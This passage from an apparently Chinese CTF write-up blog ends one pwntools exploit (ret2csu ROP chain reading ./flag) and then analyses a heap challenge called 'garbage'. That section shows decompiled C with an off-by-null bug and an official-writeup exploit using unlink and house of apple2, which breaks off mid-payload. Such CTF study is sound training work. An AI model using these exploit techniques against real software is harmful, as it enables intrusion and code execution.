number">0x0000000000001641</span>ret <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x000000000000101a</span><span class="token comment"># 0x0000000000001232 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret</span><span class="token keyword">def</span> <span class="token function">set_offset</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>    offset <span class="token operator">=</span> target <span class="token operator">-</span> raw    <span class="token keyword">if</span> offset <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        offset <span class="token operator">=</span> offset <span class="token operator">+</span> <span class="token number">0x100000000</span>    <span class="token keyword">return</span> offset<span class="token keyword">def</span> <span class="token function">set_vuln</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>        ret2csu_behind<span class="token punctuation">,</span>        offset<span class="token punctuation">,</span>        target<span class="token operator">+</span><span class="token number">0x3d</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        magic_gadget<span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">ret2csu</span><span class="token punctuation">(</span>rdi<span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>rdx<span class="token punctuation">,</span>vuln<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>        ret2csu_behind<span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>        rdi<span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>rdx<span class="token punctuation">,</span>        vuln<span class="token punctuation">,</span>        ret2csu_front<span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payloadpayload <span class="token operator">=</span> <span class="token number">0x38</span><span class="token operator">*</span><span class="token string">b'a'</span>payload <span class="token operator">+=</span> set_vuln<span class="token punctuation">(</span>set_offset<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setbuf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> ret2csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>code_base <span class="token operator">+</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> set_vuln<span class="token punctuation">(</span>set_offset<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'opendir'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>code_base<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code_base <span class="token operator">+</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'setbuf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> set_vuln<span class="token punctuation">(</span>set_offset<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'openat'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'opendir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> ret2csu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>code_base <span class="token operator">+</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> set_vuln<span class="token punctuation">(</span>set_offset<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'openat'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> ret2csu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> code_base<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> set_vuln<span class="token punctuation">(</span>set_offset<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> ret2csu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>code_base <span class="token operator">+</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>strings <span class="token operator">=</span> <span class="token string">b"."</span>strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>strings <span class="token operator">+=</span> <span class="token string">b"./flag\x00"</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="garbage"><a href="#garbage" class="headerlink" title="garbage"></a>garbage</h2><p>没pie<br><img src="/EXP_FILE/451dd04c63a18604762768c63400b9b7_MD5.jpeg"><br>【2.35-0ubuntu3.4】</p><p>试运行一下，怎么又是🤡<br><img src="/EXP_FILE/d4f10393521856c62d8138efbcf1b3c5_MD5.jpeg"></p><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><ul><li>create<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">creat_garbage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you can only creat 10 garbage"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pls input the idx of garbage: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  num <span class="token operator">=</span> <span class="token function">get_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment">// 输入index，index需要&lt;9</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token operator">></span> <span class="token number">9</span> <span class="token operator">||</span> heaparray<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token function">fault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pls input the size of garbage: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token function">get_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;=</span> <span class="token number">0x40F</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token number">0x900</span> <span class="token punctuation">)</span>              <span class="token comment">// 0x40f&lt;size&lt;=0x900</span>    <span class="token function">fault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>buf <span class="token punctuation">)</span>    <span class="token function">fault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  heaparray<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  sizearray<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pls input the content of garbage: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">// 简单使用read读入</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>delete<br>无漏洞，略</li><li>show<br>无漏洞，略</li><li>edit<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">edit_garbage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pls input the idx of garbage: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  num <span class="token operator">=</span> <span class="token function">get_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token operator">></span> <span class="token number">9</span> <span class="token operator">||</span> <span class="token operator">!</span>heaparray<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token operator">!</span>sizearray<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token function">fault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pls input the new content of garbage: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">vuln_read</span><span class="token punctuation">(</span>heaparray<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>sizearray<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>看一下这个vuln_read：<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">vuln_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+13h] [rbp-Dh] BYREF</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    buf <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">fault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> <span class="token char">'\n'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v5 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>一个off by null</li></ul><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>只能申请large size的chunk，一个off by null<br>开始的思路：高版本off by null造成堆叠，largebin attack打一个house of apple2<br>    但是本题限制了9个堆块，off by null打largebin attack根本不够用<br>wp的思路：高版本off by null，但是unlink。由于没有开pie，可以直接unlink打heaparray从而能够任意地址写。接着house of apple2即可</p><pre class="line-numbers language-python" data-language="python"><div class="caption"><span>TI:"官方WP"</span></div><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> flag<span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./challenge"</span><span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>ti <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>leak <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"--->"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'4'</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token number">0x404060</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x428</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x4f0</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x421</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4040c0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x520</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x520</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x508</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x510</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x600</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x520</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">b'Content: '</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1a61</span>leak<span class="token punctuation">(</span><span class="token string">"heap_base"</span><span class="token punctuation">,</span>heap_base<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x510</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x21a161</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x600</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x418</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x4f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token 